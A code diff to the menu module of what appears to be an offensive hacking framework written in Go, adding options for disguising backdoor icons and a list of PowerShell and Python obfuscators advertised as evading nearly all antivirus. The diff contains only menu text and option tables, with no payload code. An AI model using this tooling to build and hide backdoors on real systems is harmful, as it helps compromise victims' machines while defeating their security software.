@@ -1,4 +1,5 @@
 //John 3:16
+
 package menus
 
 import (
@@ -28,17 +29,19 @@ type TableConfig struct {
 }
 
 type PrintOptions struct {
-    LPORT     string
-    LHOST     string
-    BUILD     string
-    OUTPUT    string
-    TOOLS_DIR string
-    HPORT     string
-    PROTOCOL  string
-    SCRIPT    string
-    ICON      string
-    LISTENER  string
-    BUILDNAME string
+    LPORT      string
+    LHOST      string
+    BUILD      string
+    OUTPUT     string
+    TOOLS_DIR  string
+    HPORT      string
+    PROTOCOL   string
+    SCRIPT     string
+    ICON       string
+    COREICON   string
+    LISTENER   string
+    BUILDNAME  string
+    OBFUSCATOR string
 }
 
 
@@ -154,7 +157,7 @@ func calculateMaxWidths(rows [][]string) (int, int, int) {
 }
 
 func FormatModuleHeader(modulePath string) string {
-    return fmt.Sprintf("\nModule Options (%s%s%s%s):\n", bcolors.Italic, bcolors.Red, modulePath, bcolors.Endc)
+    return fmt.Sprintf("\nModule Options (%s%s%s):\n", bcolors.Italic, modulePath, bcolors.Endc)
 }
 
 func FormatColumnHeaders(nameWidth, settingWidth, reqWidth int) string {
@@ -266,20 +269,22 @@ func PrintSelected(opts PrintOptions, startWithNewLine bool, endWithNewLine bool
         }
     }
 
-    if opts.ICON != "" || opts.LHOST != "" || opts.LPORT != "" || opts.HPORT != "" || opts.SCRIPT != "" || opts.PROTOCOL != "" || opts.LISTENER != "" || opts.TOOLS_DIR != "" || opts.OUTPUT != "" || opts.BUILDNAME != "" {
+    if opts.ICON != "" || opts.COREICON != "" || opts.LHOST != "" || opts.LPORT != "" || opts.HPORT != "" || opts.SCRIPT != "" || opts.PROTOCOL != "" || opts.LISTENER != "" || opts.TOOLS_DIR != "" || opts.OUTPUT != "" || opts.BUILDNAME != ""  || opts.OBFUSCATOR != "" {
         fmt.Println()
     }
 
     printIfSet("ICON", opts.ICON)
-    printIfSet("LHOST", opts.LHOST)
     printIfSet("LPORT", opts.LPORT)
     printIfSet("HPORT", opts.HPORT)
+    printIfSet("LHOST", opts.LHOST)
     printIfSet("SCRIPT", opts.SCRIPT)
     printIfSet("OUTPUT", opts.OUTPUT)
-    printIfSet("PROTOCOL", opts.PROTOCOL)
     printIfSet("LISTENER", opts.LISTENER)
+    printIfSet("PROTOCOL", opts.PROTOCOL)
+    printIfSet("COREICON", opts.COREICON)
     printIfSet("TOOLS_DIR", opts.TOOLS_DIR)
     printIfSet("BUILD_NAME", opts.BUILDNAME)
+    printIfSet("OBFUSCATOR", opts.OBFUSCATOR)
 
     if printedAny && endWithNewLine {
         fmt.Println()
@@ -625,14 +630,16 @@ func ListListenersFunctions() {
 
 func ListObfscatorsFunctions() {
     fmt.Printf(`
-  # %sModule        Description%s
-  - ------        -----------`, bcolors.Bold, bcolors.Endc)
+  # %sModule       Description%s
+  - ------       -----------`, bcolors.Bold, bcolors.Endc)
 
     items := []struct {
         name string
         desc string
     }{
-        {"ghost", "It is a giant powershell evasion tool that beats almost all AVS. Try it out you will love it."},
+        {"    ghost", "This tool introduces is a methodology where you can target and obfuscate the individual components of a script with randomized variations."},
+        {"    psobf", "It is a giant powershell evasion tool that beats almost all AVS. Try it out you will love it."},
+        {"   vulkan", "Vulkan is able to obfuscate powershell scripts in order to make them undetectable against antivirus."},
         {"chameleon", "It is a python framework evasion tool that beats almost all AVS. Try it out you will love it."},
     }
 
@@ -648,8 +655,8 @@ func ListObfscatorsFunctions() {
 
 func ListIcons() {
     fmt.Printf(`
-  # %sIcon          Description%s
-  - ----          -----------`, bcolors.Bold, bcolors.Endc)
+  # %sIcon         Description%s
+  - ----         -----------`, bcolors.Bold, bcolors.Endc)
 
     items := []struct {
         name string
@@ -711,8 +718,8 @@ func ListWirelessFunctions() {
 
 func ListWebsitesFunctions() {
     fmt.Printf(`
-  # %sModule        Description%s
-  - ------        -----------`, bcolors.Bold, bcolors.Endc)
+  # %sModule      Description%s
+  - ------      -----------`, bcolors.Bold, bcolors.Endc)
 
     items := []struct {
         name string
@@ -2603,19 +2610,21 @@ func NetworksOptions(Mode, IFace, RHost, Passwd, LHost, Gateway, Spoofer, Proxie
     ))
 }
 
-func ExploitsOptions(Icon, LHost, LPort, HPort, Script, BuildName, Function, Proxy, BuildDir, Listener, Protocol string) {
+func ExploitsOptions(Icon, CoreIcon, LHost, LPort, HPort, Script, BuildName, Function, Proxy, BuildDir, Listener, Protocol, Obfuscator string) {
     rows := [][]string{
         {"ICON", Icon, "yes", "Icon to be used while generating backdoors."},
-        {"LHOST", LHost, "yes", "Mainly needed when generating backdoors and launching listeners."},
         {"LPORT", LPort, "yes", "Listener port to handle beacons."},
         {"HPORT", HPort, "yes", "Port for file smaglers in blackjack function."},
         {"BUILD", BuildName, "yes", "Output name of the backdoor to be generated."},
+        {"LHOST", LHost, "yes", "Mainly needed when generating backdoors and launching listeners."},
         {"SCRIPT", Script, "yes", "Path to PowerShell script to be obfuscated."},
         {"OUTPUT", BuildDir, "yes", "Output location for generated backdoor."},
         {"PROXIES", Proxy, "no", "Route traffic through proxies if desired."},
+        {"COREICON", CoreIcon, "yes", "THe hidden backdoor's icon. The one the user will see in the system if curious."},
         {"PROTOCOL", Protocol, "yes", "Communication protocol (tcp, http, https)."},
         {"FUNCTION", Function, "yes", "Function to perform (ghost, shellz, etc.)."},
         {"LISTENER", Listener, "yes", "Listener for callback connections."},
+        {"OBFUSCATOR", Obfuscator, "yes", "The tool to obfusicate your backdoor. Use 'show obfuscator' to list them."},
     }
 
     fmt.Println(FormatModuleOptions(
@@ -2794,10 +2803,10 @@ func ToxssInxOptions(Mode, LPort, Spoofer, RHost, LHost string) {
     ))
 }
 
-func WebsitesOptions(RHost, OutPutDir, Proxies, UserName, PassWord, WordListDir string) {
+func WebsitesOptions(RHost, ResultDir, Proxies, UserName, PassWord, WordListDir string) {
     rows := [][]string{
-        {"RHOST", RHost, "yes", "Mainly needed when generating backdoors."},
-        {"OUTPUT", OutPutDir, "no", "OutPut location."},
+        {"RHOST", RHost, "yes", "The host to be attacked eg. website."},
+        {"OUTPUT", ResultDir, "no", "OutPut location."},
         {"PROXIES", Proxies, "no", "Just incase you want to run your traffic through proxies.."},
         {"USERNAME", UserName, "no", "Single user name to attack on a give service."},
         {"PASSWORD", PassWord, "no", "Single password to use while attacking a given name or password."},
